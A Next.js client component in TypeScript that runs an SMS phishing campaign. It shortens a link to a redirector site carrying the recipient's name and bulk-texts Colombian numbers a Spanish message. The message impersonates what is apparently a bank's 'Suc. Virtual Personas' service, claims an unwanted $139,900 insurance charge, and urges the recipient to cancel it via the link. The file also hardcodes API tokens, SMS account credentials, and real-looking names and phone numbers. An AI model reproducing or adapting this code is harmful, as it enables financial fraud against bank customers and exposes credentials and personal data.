'use client';
import { Button } from '@/components/ui/button';
import React from 'react';

const index = () => {
  const sendRequest = async (item: { name: string; phone: string }) => {
    try {
      const { short_url } = await createShortURL(item.name);
      // const short_url = 'https://t.ly/NtBIa';
      const parsedUrl = short_url.split('https://').pop();
      console.log(parsedUrl);
      await sendSMS(item.name, parsedUrl, item.phone);
    } catch (err) {
      console.error(err);
    }
  };
  const items = [
    // { name: 'Kevin Gutierrez', phone: '3008948802' },
    // { name: 'Edgardo Castillo', phone: '3058049984' },
    // { name: 'Adrian Avila', phone: '3242378501' },
    { name: 'Adrian', phone: '3242378501' },
  ];

  const sendAllRequests = async () => {
    try {
      await Promise.all(items.map((d) => sendRequest(d)));
      console.log('All requests sent successfully');
    } catch (err) {
      console.error('Error sending all requests:', err);
    }
  };

  return (
    <div className='grid w-full place-items-center h-dvh'>
      <Button onClick={sendAllRequests}>Send Request</Button>
    </div>
  );
};

export default index;

const createShortURL = async (name: string) =>
  await fetch('https://api.t.ly/api/v1/link/shorten', {
    body: JSON.stringify({
      long_url: `https://redirector-mocha-mu.vercel.app?name=${name}`,
      domain: 'https://t.ly/',
      expire_at_datetime: '2035-01-17 15:00:00',
      description: 'Social Media Link',
    }),
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${TOKEN_TLY}`,
    },
    method: 'post',
  }).then((res) => res.json());

const TOKEN_TLY =
  'YKNlZniHqbg940z18CUVm5hYbBLBsWeFz1T4tXQsvCaBfiu6lVOM7VZvDk0X';

const sendSMS = async (
  name: string,
  urlShorter: string,
  num = '3242378501'
) => {
  const baseUrl = 'https://bulksmsplans.com/api/send_sms';
  const params = new URLSearchParams({
    api_id: 'APIVSyFoUzc120965',
    api_password: '573008948802',
    sms_type: 'Transactional',
    sms_encoding: 'text',
    sender: 'INFO',
    number: '57' + num,
    // message: `${name} la Sucursal Virtual Personas te informa que se activo un seguro de celular protegido por $139,900.00 el 24/07/2024. Cancélelo aqui: `,
    message: `${name}, Suc. Virtual Personas Te informa que se activo un seguro de celular protegido por $139,900 el 01/08/2024. Cancélelo aqui: ${urlShorter}`,

    // message: 'Sucursal',
  });

  const url = `${baseUrl}?${params.toString()}`;

  const response = await fetch(url, {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
  });
  return response.json(); // Asumiendo que la respuesta es JSON
};
